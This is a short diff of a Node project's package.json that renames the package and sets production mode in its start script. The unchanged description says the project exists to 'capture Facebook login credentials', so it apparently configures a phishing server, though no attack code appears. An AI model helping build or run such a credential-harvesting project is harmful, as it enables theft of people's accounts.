@@ -1,10 +1,10 @@
 {
-  "name": "reactor-server",
+  "name": "server",
   "version": "1.0.0",
   "description": "Capture Facebook login credentials using Node, Vite, and React.",
   "main": "server.js",
   "scripts": {
-    "start": "node server.js",
+    "start": "NODE_ENV=production node server.js",
     "dev": "nodemon server.js"
   },
   "keywords": [],
